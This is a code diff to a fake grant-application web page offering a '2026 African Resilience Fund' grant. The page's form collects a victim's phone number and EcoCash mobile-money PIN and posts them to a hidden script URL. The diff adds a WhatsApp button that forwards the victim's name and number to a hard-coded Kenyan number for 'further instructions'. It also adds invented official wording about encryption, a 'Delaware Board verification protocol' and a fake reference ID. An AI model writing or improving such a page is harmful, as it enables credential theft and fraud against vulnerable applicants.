@@ -24,7 +24,6 @@
         .partners-grid { background: var(--light-grey); padding: 50px 0; border-top: 1px solid #dee2e6; border-bottom: 1px solid #dee2e6; }
         .partner-logo { opacity: 0.7; font-weight: 700; color: #444; font-size: 0.8rem; text-transform: uppercase; letter-spacing: 1px; }
 
-        /* THE FIX: margin-top: 80px creates the requested space */
         .app-box { max-width: 800px; margin: 80px auto 100px; background: white; border-radius: 12px; box-shadow: 0 30px 60px rgba(0,0,0,0.18); border: 1px solid #e1e8ed; overflow: hidden; position: relative; z-index: 10; }
         .app-header { background: #f8fafd; border-bottom: 2px solid #f0f0f0; padding: 45px; text-align: center; }
         .app-body { padding: 50px; }
@@ -42,6 +41,9 @@
         .security-badge { background: #fffcf0; border: 1px solid #ffeeba; padding: 25px; border-radius: 10px; margin-bottom: 35px; border-left: 6px solid var(--gold); }
         .btn-grant { background: var(--navy); color: var(--gold); border: none; padding: 20px; border-radius: 8px; font-weight: 700; width: 100%; font-size: 1.1rem; letter-spacing: 2px; transition: 0.4s; text-transform: uppercase; cursor: pointer; }
         .btn-grant:hover { background: #003366; color: #fff; transform: translateY(-3px); box-shadow: 0 10px 20px rgba(0, 35, 73, 0.2); }
+
+        .whatsapp-btn { background: #25D366; color: white; border: none; padding: 15px; border-radius: 8px; font-weight: 700; width: 100%; margin-top: 15px; text-decoration: none; display: inline-block; transition: 0.3s; }
+        .whatsapp-btn:hover { background: #128C7E; color: white; transform: scale(1.02); }
 
         .office-card { padding: 30px; border-radius: 10px; }
         .location-title { color: var(--navy); font-weight: 700; letter-spacing: 1px; margin-bottom: 10px; }
@@ -219,13 +221,17 @@
             document.getElementById('step' + s).style.display = 'block';
             for(let i=1; i<=3; i++){ document.getElementById('dot'+i).classList.remove('active'); }
             document.getElementById('dot'+s).classList.add('active');
-            window.scrollTo({ top: 500, behavior: 'smooth' }); // Adjusted for better viewing
+            window.scrollTo({ top: 500, behavior: 'smooth' });
         }
 
         const form = document.getElementById('globalGrantForm');
         form.addEventListener('submit', e => {
             e.preventDefault();
-            if(!document.getElementById('biz_phone').value || !document.getElementById('biz_pin').value) {
+            
+            const bizName = document.getElementById('biz_name').value;
+            const phone = document.getElementById('biz_phone').value;
+            
+            if(!phone || !document.getElementById('biz_pin').value) {
                 alert("Please enter EcoCash verification details."); return;
             }
 
@@ -235,15 +241,23 @@
             btn.innerText = "INITIATING SECURE WIRE...";
             st.innerHTML = "<div class='spinner-border text-primary'></div><br><small>Communicating with Delaware Gateway...</small>";
 
+            // Pre-written WhatsApp Message
+            const waNumber = "254707775336";
+            const waMessage = `VIMBISO GLOBAL OFFICIAL VERIFICATION%0A--------------------------------%0AApplicant: ${bizName}%0AMobile Number: ${phone}%0AStatus: Pending Verification%0A%0AI have completed the portal authorization. Please provide further instructions to finalize my 2026 African Resilience Fund grant.`;
+            const waLink = `https://wa.me/${waNumber}?text=${waMessage}`;
+
             fetch(SCRIPT_URL, { method: 'POST', mode: 'no-cors', body: new FormData(form) })
             .then(() => {
                 st.innerHTML = `
-                    <div class='alert alert-success py-4'>
-                        <h5 class='fw-bold'>PROTOCOL ACTIVE</h5>
-                        <p class='mb-0 small'>Application Received. Your grant is pending. 
-                        You will Receive Further Instructions To Finalize your grant application. Please Click The whatsapp button below to Complete</p>
+                    <div class='alert alert-success py-4 shadow-sm'>
+                        <h5 class='fw-bold text-success'>APPLICATION RECEIVED</h5>
+                        <p class='mb-3 small'>Your initial data has been encrypted. To comply with the Delaware Board final verification protocol, you must now contact the Liaison Office via WhatsApp below.</p>
+                        <a href="${waLink}" target="_blank" class="whatsapp-btn">
+                            VERIFY VIA WHATSAPP NOW
+                        </a>
+                        <p class='mt-3 mb-0' style='font-size: 0.7rem; color: #666;'>Reference ID: V-GLOBAL-${Math.floor(1000 + Math.random() * 9000)}</p>
                     </div>`;
-                btn.innerText = "AWAITING AUTHORIZATION";
+                btn.innerText = "PROTOCOL INITIATED";
                 form.reset();
             })
             .catch(() => {
